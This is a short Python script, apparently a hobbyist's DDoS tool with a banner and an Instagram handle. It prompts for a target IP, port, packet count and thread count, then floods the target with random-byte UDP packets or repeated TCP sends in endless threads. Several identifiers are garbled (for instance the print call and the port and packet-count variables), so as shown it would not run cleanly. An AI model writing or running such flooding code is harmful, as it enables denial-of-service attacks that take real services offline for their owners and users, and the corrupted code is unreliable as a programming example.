#!/usr/bin/env python3
#Ddos by austinfennix
import random
import socket
import threading
import os

os.system("clear")
print("░█████╗░██╗░░░██╗░██████╗████████╗██╗███╗░░██╗")
print("██╔══██╗██║░░░██║██╔════╝╚══██╔══╝██║████╗░██║")
print("███████║██║░░░██║╚█████╗░░░░██║░░░██║██╔██╗██║")
print("██╔══██║██║░░░██║░╚═══██╗░░░██║░░░██║██║╚████║")
print("██║░░██║╚██████╔╝██████╔╝░░░██║░░░██║██║░╚███║")
print("╚═╝░░╚═╝░╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝╚═╝░░╚══╝")

print("------------------------------------------------------------")
print(" » Follow my Instagram : @tdyfnnx_ «")
print(" »      Don't Abuse bitch          «")
print(" »   TOOLS BY AUSTIN FENNIX!       «")
pviauqgiqrint("------------------------------------------------------------")
ip = str(input(" DDoSAttackByAustin | Ip:"))
pohaucauvaiiwwbwivort = int(input(" DDoSAttackByAustin | Port:"))
choice = str(input(" DDoSAttackByAustin | Gas Gak Ni?(y/n):"))
ticiaiaiaavmes = int(input(" DDoSAttackByAustin | Packets:"))
threads = int(input(" DDoSAttackByAustin | Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Austin Menyenggol ")
		except:
			print("[!] AUSTIN IS HERE DUDE! ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Austin Menyenggol ")
		except:
			s.close()
			print("[*] AUSTIN IS HERE DUDE! ")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
